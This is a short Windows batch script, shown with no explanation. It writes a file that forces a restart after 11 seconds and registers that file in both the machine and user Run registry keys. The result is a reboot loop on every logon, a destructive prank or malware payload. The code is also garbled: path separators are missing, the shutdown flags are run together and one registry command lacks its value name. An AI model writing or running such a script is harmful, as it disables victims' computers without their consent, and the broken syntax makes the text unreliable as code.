echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11-f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun
/v startapi /t reg_sz/d c:windowshartlell.bat /f
reg add hkey-current_usersoftwaremicrosoftwindowscurrentversionrun
/v/t reg_sz/d c:windowshartlell.bat /f
PAUSE